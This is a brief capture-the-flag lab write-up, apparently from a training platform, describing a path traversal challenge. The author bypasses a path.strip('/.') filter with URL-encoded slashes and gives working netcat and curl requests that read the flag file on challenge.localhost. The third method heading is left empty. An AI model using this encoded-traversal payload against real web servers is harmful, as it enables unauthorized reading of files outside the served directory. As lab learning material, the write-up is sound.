I WAY -> netcat
-clicked start
-opened the terminal
-ran: 'cat /challenge/server'
found out the only enpoint available is /serve
then, the challenge works very similar to the previous one but this time the requested path is built in the following way:
app.root_path = /challenge
/files/
path.strip("/.") = it stripes the path removing "." and "/" in the beginning and in the end of the file
example: path = ../../brodero/../bro/../  ->   path.strip("/.") = brodero/../bro
so the goal is to craft the path w/out using "." and "/" in the beginning and in the end
-ran: '/challenge/server'
-ran: 'nc -v challenge.localhost 80'
-typed: 'GET /serve/fortunes%2F..%2F..%2F..%2Fflag HTTP/1.1'
        'Host: challenge.localhost'
-flag popped out

II WAY -> curl
-clicked start
-opened the terminal
-ran: '/challenge/server'
-ran: 'curl -v "http://challenge.localhost/serve/fortunes%2F..%2F..%2F..%2Fflag"'
-flag popped out

III WAY -> browser
